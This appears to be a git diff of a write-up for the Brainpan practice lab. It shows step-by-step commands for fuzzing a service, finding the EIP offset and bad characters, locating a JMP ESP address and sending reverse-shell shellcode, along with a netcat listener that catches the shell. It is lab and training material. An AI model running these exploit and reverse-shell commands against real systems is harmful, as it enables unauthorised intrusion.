@@ -23,9 +23,9 @@ Interact with the app and take note of the expected input.
 nc -nv 192.168.90.136
 ```
 
-
+![1](imgs/brainpan-writeup1.png?raw=true)
 ...
-
+![2](imgs/brainpan-writeup2.png?raw=true)
 
 
 ## 2. Fuzz
@@ -38,19 +38,19 @@ Run the application in Immunity Debugger and execute the fuzzer:
 ```
 ./sock-stream-fuzz.py --rhost=192.168.90.136 --rport=9999 -f --buffstep=200
 ```
-
+![3](imgs/brainpan-writeup3.png?raw=true)
 
 Application crashed with 600 bytes!
 
 We can see in the debugger that the EIP registry was overwriten:
-
+![4](imgs/brainpan-writeup4.png?raw=true)
 
 
 Testing the application with a buffer head, we can see that we were also able to write to memory positions pointed by EDX and ESP. 
 ```
 ./ig-buffer-overflow.py -m test --rhost=192.168.90.136 --rport=9999 --buffsize=1000 --buffhead='HELLO '
 ```
-
+![5](imgs/brainpan-writeup5.png?raw=true)
 
 
 ## 3. Find EIP offset
@@ -63,7 +63,7 @@ Re-run the application in the debugger and send the cyclic string:
 ```
 ./ig-buffer-overflow.py -m cyclic --rhost=192.168.90.136 --rport=9999 --buffsize=600 --buffhead=''
 ```
-
+![6](imgs/brainpan-writeup6.png?raw=true)
 
 
 Check offset:
@@ -78,30 +78,29 @@ Write bad chars to found memory position to find out which chars we have to excl
 ```
 ./ig-buffer-overflow.py -m write --rhost=192.168.90.136 --rport=9999 --buffsize=600 --buffhead='' --offset=524 --hexcontent=BBBBBBBB --before=badchar --exclude=00 --nopsb=2
 ```
+![7](imgs/brainpan-writeup7.png?raw=true)
 
-
-
+```
 !mona config -set workingfolder c:\temp
-
 !mona bytearray
-
 !mona compare -f c:\monalogs\brainpan_2164\bytearray.bin -a 005FF80B
-
-
+```
+![8](imgs/brainpan-writeup8.png?raw=true)
 
 ## 5. Find JMP instruction
-
+```
 !mona jmp -n -r ESP
-
-
+```
+![9](imgs/brainpan-writeup9.png?raw=true)
 
 JMP ESP address = 0x311712f3
 
 Set breakpoint at 0x311712f3 and test it writing even more bytes to the application (the following command also adds some nops before and after write content):
 
 ./ig-buffer-overflow.py -m write --rhost=192.168.90.136 --rport=9999 --buffsize=1200 --buffhead='' --offset=524 --hexcontent=l311712f3 --after=BBBB --nopsa=4 --before=CCCC --nopsb=10
-
-
+```
+![10](imgs/brainpan-writeup10.png?raw=true)
+```
 
 ## 6. Exploit!
 
@@ -118,14 +117,10 @@ sudo rlwrap -a nc -lvnp 443
 Exploit:
 ```
 ./ig-buffer-overflow.py -m write --rhost=192.168.90.136 --rport=9999 --buffsize=1200 --buffhead='' --offset=524 --hexcontent=l311712f3 --after=shellcode --nopsa=10 --shellcode=reverse2
-
-
 ```
 
 Got the shell!!
-
-
-
+![11](imgs/brainpan-writeup11.png?raw=true)
 
 
 THE END!
